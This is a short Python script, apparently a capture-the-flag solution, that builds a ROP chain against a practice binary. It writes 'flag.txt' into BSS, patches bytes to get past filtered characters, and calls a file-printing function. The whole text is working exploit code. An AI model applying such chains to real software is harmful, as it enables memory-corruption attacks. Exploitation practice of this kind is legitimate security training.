#!/usr/bin/python3

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, 8)

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

BSS_ADDR = 0x601038
BSS = PACKP(BSS_ADDR)
FILE = PACKP(0x400510)
XOR_AT_R15_BY_R14 = PACKP(0x400628)
ADD_AT_R15_BY_R14 = PACKP(0x40062c)
SUB_AT_R15_BY_R14 = PACKP(0x400630)

MOV_R12_AT_R13 = PACKP(0x400634)
POP_R12_13_14_15 = PACKP(0x40069c)
POP_R14_15 = PACKP(0x4006a0)
POP_RDI = PACKP(0x4006a3)

rop = b"a" * 40
rop += POP_R12_13_14_15 + bytes("flag.txt", 'utf-8') + BSS
rop += PACKP(0) + PACKP(0)
rop += MOV_R12_AT_R13

rop += POP_R14_15 + PACKP(ord('a') - 0xeb + 0x100) + PACKP(BSS_ADDR + 2)
rop += ADD_AT_R15_BY_R14
rop += POP_R14_15 + PACKP(ord('g') - 0xeb + 0x100) + PACKP(BSS_ADDR + 3)
rop += ADD_AT_R15_BY_R14
rop += POP_R14_15 + PACKP(ord('.') - 0xeb + 0x100) + PACKP(BSS_ADDR + 4)
rop += ADD_AT_R15_BY_R14
rop += POP_R14_15 + PACKP(0x73) + PACKP(BSS_ADDR + 6)
rop += SUB_AT_R15_BY_R14

rop += POP_RDI + BSS
rop += FILE

echo(rop)

#

